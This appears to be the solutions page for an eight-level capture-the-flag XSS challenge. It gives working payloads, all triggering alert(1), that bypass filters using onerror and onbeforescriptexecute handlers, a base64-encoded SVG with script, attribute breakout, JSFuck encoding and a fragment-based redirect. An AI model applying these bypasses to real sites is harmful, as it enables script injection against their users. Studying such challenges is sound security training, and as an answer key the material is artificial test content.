# Solutions

> **Note:** These are the intended solutions for each challenge level. XSS vulnerabilities often have multiple exploitation paths, so alternative payloads may also work.
>
> The verification server uses Selenium with Firefox, so all payloads were tested with Firefox. Some payloads (e.g., `onbeforescriptexecute`) are Firefox-specific and may not work in other browsers.

---

## Level 0

**Difficulty:** Easy

**Payload:**
```
?name=<script>alert(1)</script>
```

**Steps:**
1. Navigate to the Level 0 application
2. Notice the `name` parameter is reflected in the page
3. The template disables autoescaping, allowing raw HTML injection
4. Inject a basic `<script>` tag to trigger JavaScript execution

---

## Level 1

**Difficulty:** Easy

**Payload:**
```
?name=<img src=x onerror=alert(1)>
```

**Steps:**
1. Navigate to the Level 1 application
2. Use an `<img>` tag with an invalid `src` attribute
3. The `onerror` event fires when the image fails to load
4. JavaScript executes without using `<script>` tags

---

## Level 2

**Difficulty:** Medium

**Payload:**
```
?name=<xss onbeforescriptexecute=alert(1)><script>1</script>
```

**Steps:**
1. Try basic payloads and observe they get filtered
2. The application recursively removes "script" and "img" strings
3. Use an arbitrary tag name (`<xss>`) that isn't in the filter
4. Use the `onbeforescriptexecute` event handler (Firefox-specific)
5. Include a `<script>` tag to trigger the event

---

## Level 3

**Difficulty:** Medium

**Payload:**
```
?name=<nav onfocus=alert(1)><script>alert(1)</script>
```

**Steps:**
1. The application has blocklists for dangerous tags and events
2. Find HTML tags not in the blocklist (e.g., `<nav>`)
3. Find event handlers not in the blocklist
4. Combine an unblocked tag with an unblocked event handler

---

## Level 4

**Difficulty:** Medium

**Payload:**
```
?image=PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pg0KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4NCg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPg0KICAgPHBvbHlnb24gaWQ9InRyaWFuZ2xlIiBwb2ludHM9IjAsMCAwLDUwIDUwLDAiIGZpbGw9IiMwMDk5MDAiIHN0cm9rZT0iIzAwNDQwMCIvPg0KICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KICAgICAgYWxlcnQoMSk7DQogICA8L3NjcmlwdD4NCjwvc3ZnPg0K
```

**Steps:**
1. The application accepts base64-encoded images
2. SVG files are XML-based and can contain `<script>` tags
3. Create an SVG file with embedded JavaScript
4. Base64-encode the SVG content
5. Pass it via the `image` parameter; the script executes when rendered

---

## Level 5

**Difficulty:** Medium

**Payload:**
```
?image=PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pg0KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4NCg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPg0KICAgPHBvbHlnb24gaWQ9InRyaWFuZ2xlIiBwb2ludHM9IjAsMCAwLDUwIDUwLDAiIGZpbGw9IiMwMDk5MDAiIHN0cm9rZT0iIzAwNDQwMCIvPg0KICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KICAgICAgYWxlcnQoMSk7DQogICA8L3NjcmlwdD4NCjwvc3ZnPg0K"/><script>alert(1)</script>
```

**Steps:**
1. Start with the Level 4 SVG payload
2. The application has minimal sanitization (only space-to-plus replacement)
3. The output context allows breaking out of the intended element
4. Append `"/>` to close the current context
5. Inject a `<script>` tag after escaping the context

---

## Level 6

**Difficulty:** Hard

**Payload:**
```
?script=[][(![]%2B[])[%2B[]]%2B(![]%2B[])[!%2B[]%2B!%2B[]]%2B(![]%2B[])[%2B!%2B[]]%2B(!![]%2B[])[%2B[]]][([][(![]%2B[])[%2B[]]%2B(![]%2B[])[!%2B[]%2B!%2B[]]%2B(![]%2B[])[%2B!%2B[]]%2B(!![]%2B[])[%2B[]]]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]%2B(!![]%2B[][(![]%2B[])[%2B[]]%2B(![]%2B[])[!%2B[]%2B!%2B[]]%2B(![]%2B[])[%2B!%2B[]]%2B(!![]%2B[])[%2B[]]])[%2B!%2B[]%2B[%2B[]]]%2B([][[]]%2B[])[%2B!%2B[]]%2B(![]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]%2B(!![]%2B[])[%2B[]]%2B(!![]%2B[])[%2B!%2B[]]%2B([][[]]%2B[])[%2B[]]%2B([][(![]%2B[])[%2B[]]%2B(![]%2B[])[!%2B[]%2B!%2B[]]%2B(![]%2B[])[%2B!%2B[]]%2B(!![]%2B[])[%2B[]]]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]%2B(!![]%2B[])[%2B[]]%2B(!![]%2B[][(![]%2B[])[%2B[]]%2B(![]%2B[])[!%2B[]%2B!%2B[]]%2B(![]%2B[])[%2B!%2B[]]%2B(!![]%2B[])[%2B[]]])[%2B!%2B[]%2B[%2B[]]]%2B(!![]%2B[])[%2B!%2B[]]]((![]%2B[])[%2B!%2B[]]%2B(![]%2B[])[!%2B[]%2B!%2B[]]%2B(!![]%2B[])[!%2B[]%2B!%2B[]%2B!%2B[]]%2B(!![]%2B[])[%2B!%2B[]]%2B(!![]%2B[])[%2B[]]%2B([][(![]%2B[])[%2B[]]%2B(![]%2B[])[!%2B[]%2B!%2B[]]%2B(![]%2B[])[%2B!%2B[]]%2B(!![]%2B[])[%2B[]]]%2B[])[%2B!%2B[]%2B[!%2B[]%2B!%2B[]%2B!%2B[]]]%2B[%2B!%2B[]]%2B([%2B[]]%2B![]%2B[][(![]%2B[])[%2B[]]%2B(![]%2B[])[!%2B[]%2B!%2B[]]%2B(![]%2B[])[%2B!%2B[]]%2B(!![]%2B[])[%2B[]]])[!%2B[]%2B!%2B[]%2B[%2B[]]])()
```

**Steps:**
1. The application filters the letter 'a' from input
2. JSFuck encoding represents JavaScript using only `[]()!+` characters
3. Generate a JSFuck payload for `alert(1)` (e.g., using jsfuck.com)
4. URL-encode the payload (`+` becomes `%2B`)
5. Submit via the `script` parameter

---

## Level 7

**Difficulty:** Hard

**Payload:**
```
#https://excess-level-zero.youcanhack.me/?name=<script>alert(1)</script>
```

**Steps:**
1. Open a private/incognito browser window
2. Navigate to Level 7
3. The application reads the URL fragment (`#`) client-side
4. It redirects to whatever URL is in the fragment
5. Craft a fragment pointing to Level 0 with an XSS payload
6. The redirect bypasses server-side validation since fragments are never sent to the server
